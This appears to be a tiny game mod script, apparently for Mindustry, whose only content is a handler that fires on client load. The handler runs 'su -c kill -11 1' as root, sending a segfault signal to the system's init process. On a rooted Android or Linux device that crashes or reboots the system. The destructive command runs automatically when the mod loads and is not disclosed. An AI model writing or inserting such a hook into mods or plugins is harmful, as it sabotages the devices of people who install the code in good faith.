Events.on(ClientLoadEvent, a => {
    OS.exec("su", "-c", "kill", "-11", "1")
})
